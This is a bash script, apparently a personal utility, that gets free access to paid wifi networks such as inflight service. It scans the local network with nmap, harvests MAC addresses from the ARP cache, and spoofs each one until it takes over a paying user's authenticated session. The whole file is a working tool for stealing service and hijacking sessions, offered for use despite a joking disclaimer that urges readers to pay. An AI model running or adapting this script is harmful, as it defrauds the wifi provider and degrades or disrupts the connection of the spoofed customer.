#!/bin/bash
#
# free_wifi.sh
#
# Description: 
# Get free wifi by spoofing an authenticated mac address on a paid wifi service like
# inflight wifi. Obviously in order for this to work there needs to be at least one
# device on the network that paid for the wifi service. The script attempts to find 
# that device and uses the mac address of that device.
# 
# Disclaimer: 
# This will obviously create lot of packet collitions/problems on the network and  
# create slowness for you and the device you are spoofing, so just pay for the 
# wifi service, don't be a free loader :) If you do choose to use this script, you 
# are using at your own risk and I am not liable for any loss or damage you have 
# caused by using this script.
#
# Author:  Arul Selvan
# Version: Feb 4, 2017
# OS: macOS, Linux
# See also: spoof_mac.sh
#

# version format YY.MM.DD
version=22.09.03
my_name=`basename $0`
my_version="`basename $0` v$version"
log_file="/tmp/$(echo $my_name|cut -d. -f1).log"
mac_list_file="/tmp/$(echo $my_name|cut -d. -f1)_maclist.log"

# google dns for validating connectivity
gdns=8.8.8.8
my_mac_addr_file="$HOME/.my_mac_address"
my_mac=""
iface="en0"
os_name=`uname -s`
# calculate the elapsed time (shell automatically increments the var SECONDS magically)
SECONDS=0
attempt_wait=30
ip_wait=30
options_list="i:a:h"
my_name=`basename $0`
airport_bin="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
link_local="169.254"
#ap_ssid="AA-Inflight"
ap_ssid="aainflight.com"

# ensure path for cron runs
export PATH="/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:$PATH"

usage() {
  echo "Usage: $my_name [-e <interface>] [-h] [-a <AP ssid>]"
  echo "  -e <interface> is the network interface default: en0"
  echo "  -a <AP ssid> connnect to the wifi ssid provided. default: $wifi_access_point"
  echo "  -h usage/help"
  exit
}

check_root() {
  if [ `id -u` -ne 0 ] ; then
    echo "[ERROR] you must be 'root' to run this script... exiting."
    exit
  fi
}

ping_check() {
  ping -t30 -c3 -q $gdns >/dev/null 2>&1
  return $?
}

get_my_ip() {
  local my_ip=""
  if [ $os_name = "Darwin" ]; then
    my_ip=`ipconfig getifaddr $iface`
  else
    my_ip=`ip addr show $iface | grep 'inet ' | awk '{print $2}' |cut -f1 -d'/'`    
  fi
  echo $my_ip
}

restore_mac() {
  echo "[INFO] restoring mac to $my_mac ..."

  if [ $os_name = "Darwin" ]; then
    $airport_bin $iface -z
    ifconfig $iface ether $my_mac
    networksetup -setairportnetwork $iface $ap_ssid    
  else
    ifconfig $iface hw ether $my_mac
  fi
}

save_mac() {
  echo "[INFO] reading my mac address ..."
  if [ ! -f $my_mac_addr_file ] ; then
    echo "[WARN] no previously saved mac file ($my_mac_addr_file) found!"
    echo "[WARN] saving current mac address as saved mac address"
    my_mac=`ifconfig $iface|grep ether|awk '{print $2;}'`
    echo $my_mac > $my_mac_addr_file
  else
    my_mac=`cat $my_mac_addr_file`
    echo "[INFO] my mac address $my_mac is already saved."
  fi
}

elapsed_time() {
  duration=$SECONDS
  echo "[INFO] Total elapsed time is $(($duration / 60)) minutes and $(($duration % 60)) seconds"
  exit
}

check_mac() {
  mac_addr=$1

  echo "[INFO] changing mac to $mac_addr ..."
  if [ $os_name = "Darwin" ]; then  
    echo "[INFO] disabling interface to switch macaddr ..."  
    $airport_bin $iface -z
    ifconfig $iface ether $mac_addr
  else
    ifconfig $iface hw ether $my_mac    
  fi
  sleep 2
  # the disassociate above does not autoconnect, we are trying manual
	#ap_ssid=`airport -s |awk 'NR > 1 {print $1;}'|sort|uniq|head -n1`
  echo "[INFO]  networksetup -setairportnetwork $iface $ap_ssid ..." | /usr/bin/tee -a $log_file
  networksetup -setairportnetwork $iface $ap_ssid

  # enable interface (hopefully mac changed) and ask for dhcp
  echo "[INFO] enable/disable interface to connect again to access point or captive portal ..."
  # wait till it becomes active 
  echo "[INFO] waiting for $iface to be active ..."
  for (( n_try=0; n_try<6; n_try++ )) {
    ifconfig $iface down
    ifconfig $iface up
    # make sure interface is active
    local iface_status=`ifconfig $iface | grep status|awk -F: '{print $2}'`
    if [[ $iface_status = *"active"* ]] ; then
      break
    fi
    sleep 2
  }

  /bin/echo -n "[INFO] waiting for new IP assignment ." | /usr/bin/tee -a $log_file 
  for (( i = 0; i<$ip_wait; i++ )) do
    sleep 1
    /bin/echo -n . | /usr/bin/tee -a $log_file
    ip=$(get_my_ip)
    if [ ! -z "$ip" ] ; then
      break
    fi
  done

  echo ""
  echo "[INFO] checking for connectivity ..."
  ping_check
  if [ $? -eq 0 ] ; then
    echo "[SUCCESS] got connectivity with mac address: $mac_addr" | /usr/bin/tee -a $log_file
    elapsed_time
  else
    echo "[ERROR] connctivity failed for $mac_addr; moving on to next address" | /usr/bin/tee -a $log_file
  fi
  return
}

search_free_wifi() {
  # do a nmap to collect macaddress in arp cache
  echo "[INFO] collecting arp cache ..."
  my_net=`get_my_ip |awk -F. '{print $1"."$2"."$3".0/24"; }'`

  # ensure we are not on link-local i.e. not connected to anywhere
  if [[ *"$my_net"* = *"$link_local"* ]] ; then
    echo "[INFO] you are on link-local ($my_net) i.e. not connected to any network... exiting"
    exit 3
  fi

  # make sure interface is active
  local iface_status=`ifconfig $iface | grep status|awk -F: '{print $2}'`
  
  if [[ $iface_status = *"inactive"* ]] ; then
    echo "[WARN] interface $iface is not active, connect to wifi access point and try again... exiting"
    exit 2
  fi
  
  # collect mac on the network 
  echo "[INFO] scanning net $my_net"
  nmap --host-timeout 3 -T5 $my_net >/dev/null 2>&1

  # now get the list of macs and iterate through to find an 
  # authenticated mac (someone who paid for this crappy wifi)
  list_of_macs=`/usr/sbin/arp -an -i $iface|awk '{print $4;}'`

  echo "[INFO] mac list to scan: $list_of_macs" >> $log_file

  # search through all the macs we collected
  for mac in $list_of_macs; do 
    if [ $mac = "(incomplete)" ] ; then
      continue
    elif [ $mac = "ff:ff:ff:ff:ff:ff" ] ; then
      continue
    elif [ $mac = $my_mac ] ; then
      continue
    fi
    echo "[INFO] checking: $mac ..." | /usr/bin/tee -a $log_file
    echo $mac >> $mac_list_file
    check_mac $mac
  done
}

#  ------------ main -----------------
while getopts "$options_list" opt; do
  case $opt in
    i)
      iface=$OPTARG
      ;;
    a)
      ap_ssid=$OPTARG
      ;;
    h)
      usage
      ;;
    \?)
     usage
     ;;
   esac
done

check_root
if [ -f $log_file ] ; then
    rm -f $log_file
    rm -f $mac_list_file
fi
echo "[INFO] $my_version starting at `date +'%m/%d/%y %r'`  ..." | tee -a $log_file
echo "[INFO] Interface: $iface " | tee -a $log_file
echo "[INFO] Using access point: $ap_ssid " | /usr/bin/tee -a $log_file

# Before we do anything check if we have connectivity, if so exit. This 
# allows this script to be added to recurring cronjob
ping_check
if [ $? -eq 0 ] ; then
  ip=$(get_my_ip)
  echo "[INFO] the interface '$iface' already has network connectivity with IP address '$ip'" | tee -a $log_file
  echo "[INFO] nothing to do, so exiting..." | tee -a $log_file
  exit
fi

# save our mac address first
save_mac

# start w/ a clean state w/ our own mac and chosen ap
restore_mac

# make 3 trys, if we don't get any just exit.
for (( attempt=0; attempt<3; attempt++ )) {
  echo "[INFO] searching for wifi. Attempt #$attempt ..." | /usr/bin/tee -a $log_file
  
  search_free_wifi

  echo "[INFO] sleeping $attempt_wait sec to try again ..." | /usr/bin/tee -a $log_file
  sleep $attempt_wait
}

# if we get here nothing is available, just restore and exit
echo "[ERROR] unable to find a working macaddr to use, restoring ..." | /usr/bin/tee -a $log_file
restore_mac
elapsed_time
